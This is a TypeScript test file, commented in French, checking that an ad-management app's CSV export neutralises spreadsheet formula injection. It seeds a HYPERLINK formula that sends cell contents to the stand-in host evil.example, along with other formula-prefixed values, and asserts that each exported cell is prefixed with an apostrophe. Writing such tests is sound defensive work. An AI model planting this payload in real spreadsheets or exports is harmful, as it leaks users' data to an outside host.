import { describe, it, expect, vi, beforeAll } from 'vitest';

const ids = vi.hoisted(() => {
  const { randomUUID } = require('node:crypto') as typeof import('node:crypto');
  return { wsId: randomUUID(), brandId: randomUUID() };
});

vi.mock('@tiktrends/db', async (importOriginal) => {
  const actual = await importOriginal<typeof import('@tiktrends/db')>();
  const { pgMemoire } = await import('./helpers/pg-memoire');
  const db = await pgMemoire(actual.schema as unknown as Record<string, unknown>);
  return { ...actual, db };
});

// Session d'un AUTRE membre qui exporte · la marque active porte l'apprentissage piégé.
vi.mock('../lib/adsmap-guard', () => ({
  adsmapGuard: async () => ({
    s: { user: { id: ids.wsId, email: 'lecteur@test.local', name: null }, workspaceId: ids.wsId, workspaceName: 'Agence', role: 'member', plan: 'business' },
    brand: { id: ids.brandId, name: 'Marque A', workspaceId: ids.wsId },
  }),
}));

import { db, schema } from '@tiktrends/db';
import { parseCsv } from '@tiktrends/core';
import { exportAdsCsvAction } from '../app/actions/adsmap';

/**
 * Injection de formule · la VRAIE `exportAdsCsvAction`, sur une vraie base.
 *
 * Un membre arbitre un test avec l'apprentissage
 * `=HYPERLINK("https://evil.example/?d="&A2&B2;"Voir la preuve")` · un autre
 * exporte le CSV et l'ouvre dans Excel ou Sheets. Avant correction, la cellule
 * partait telle quelle (entre guillemets RFC 4180, qui n'empêchent pas
 * l'évaluation) et s'exécutait. On lit le fichier RENDU, colonne par colonne.
 */
const PIEGE = '=HYPERLINK("https://evil.example/?d="&A2&B2;"Voir la preuve")';

let csv = '';

beforeAll(async () => {
  await db.insert(schema.workspaces).values({ id: ids.wsId, name: 'Agence' });
  await db.insert(schema.brands).values({ id: ids.brandId, workspaceId: ids.wsId, name: 'Marque A' });
  const [persona] = await db.insert(schema.personas).values({ brandId: ids.brandId, name: 'P' }).returning();
  const [desire] = await db.insert(schema.desires).values({ workspaceId: ids.wsId, personaId: persona!.id, label: '+Confiance' }).returning();
  const [angle] = await db.insert(schema.angles).values({ workspaceId: ids.wsId, desireId: desire!.id, label: 'Preuve', mechanism: 'demo' }).returning();
  const [concept] = await db.insert(schema.concepts).values({ workspaceId: ids.wsId, angleId: angle!.id, title: '@SUM(A1)' }).returning();
  const [ad] = await db.insert(schema.ads).values({ workspaceId: ids.wsId, conceptId: concept!.id, variantCode: 'v1', hypothesis: '-1+1 en accroche' }).returning();
  await db.insert(schema.verdicts).values({ adId: ad!.id, workspaceId: ids.wsId, computed: 'winner', validated: 'winner', status: 'validated', comparable: true, metricsAgg: { cpa: -12.5, spend: 1234.5, purchases: 3 } });
  await db.insert(schema.learnings).values({ workspaceId: ids.wsId, brandId: ids.brandId, adId: ad!.id, scope: 'ad', statement: PIEGE, status: 'validated' });

  const r = await exportAdsCsvAction({}, true);
  expect(r.error).toBeUndefined();
  csv = r.csv ?? '';
});

/** Découpe une ligne `;` en respectant les guillemets RFC, SANS retirer l'apostrophe (ce que lit le tableur). */
function champsDe(l: string): string[] {
  const champs: string[] = [];
  let cur = '', q = false;
  for (let k = 0; k < l.length; k++) {
    const c = l[k]!;
    if (q) { if (c === '"') { if (l[k + 1] === '"') { cur += '"'; k++; } else q = false; } else cur += c; continue; }
    if (c === '"') { q = true; continue; }
    if (c === ';') { champs.push(cur); cur = ''; continue; }
    cur += c;
  }
  champs.push(cur);
  return champs;
}
const lignes = () => csv.replace(/^\uFEFF/, '').split('\r\n').filter(Boolean).map(champsDe);

/** Le champ rendu d'une colonne, pour l'unique ad semée. */
function brut(col: string): string {
  const [entete, ligne] = lignes();
  const i = entete!.indexOf(col);
  expect(i, `colonne ${col} absente de l'export`).toBeGreaterThanOrEqual(0);
  return ligne![i]!;
}

describe('exportAdsCsvAction · aucune cellule ne part évaluable', () => {
  it('l’apprentissage piégé sort préfixé d’une apostrophe, dans les deux colonnes qui le portent', () => {
    expect(brut('Apprentissages'), 'l’apprentissage piégé part évaluable dans le tableur').toBe(`'${PIEGE}`);
    expect(brut('Learnings')).toBe(`'${PIEGE}`);
    // Le fichier brut · neutralisé PUIS échappé RFC 4180.
    expect(csv).toContain(`"'=HYPERLINK(""https://evil.example/?d=""&A2&B2;""Voir la preuve"")"`);
    expect(csv).not.toMatch(/(^|;)"?=HYPERLINK/m);
  });

  it('concept, désir et hypothèse saisis sont neutralisés aussi', () => {
    expect(brut('Ad Concept')).toBe("'@SUM(A1)");
    expect(brut('📎 Désire')).toBe("'+Confiance");
    expect(brut("Que testez-vous et qu'est-ce qui vous donne confiance dans le fait que ce test améliorera les performances globales ?")).toBe("'-1+1 en accroche");
  });

  it('les nombres restent des nombres · CPA négatif et dépense jamais préfixés', () => {
    expect(brut('CPA'), 'le CPA a été préfixé · le tableur le lirait comme du texte').toBe('-12,5');
    expect(brut('Dépense')).toBe('1\u202F234,5');   // groupe U+202F de sheetNumber
    expect(brut('Achats')).toBe('3');
  });

  it('aucune cellule de la ligne ne commence par un caractère de formule hors nombre', () => {
    const [entete, ligne] = lignes();
    expect(ligne).toHaveLength(entete!.length);
    entete!.forEach((col, k) => {
      const v = ligne![k]!;
      if (/^-?[\d\u202F,]+$/.test(v)) return;   // forme numérique de sheetNumber
      expect(v, `colonne « ${col} » commence par un caractère de formule`).not.toMatch(/^[=+\-@\t\r]/);
    });
  });

  it('réimporté (lecture du noyau), le fichier redonne la valeur saisie, sans apostrophe', () => {
    // L'import détecte le point-virgule de l'export · le fichier est relu tel quel
    // (allers-retours complets : `adsmap-import-aller-retour-db.test.ts`).
    const relu = parseCsv(csv);
    const i = relu[0]!.indexOf('Apprentissages');
    expect(relu[1]![i], 'l’import garde l’apostrophe de l’export').toBe(PIEGE);
  });
});
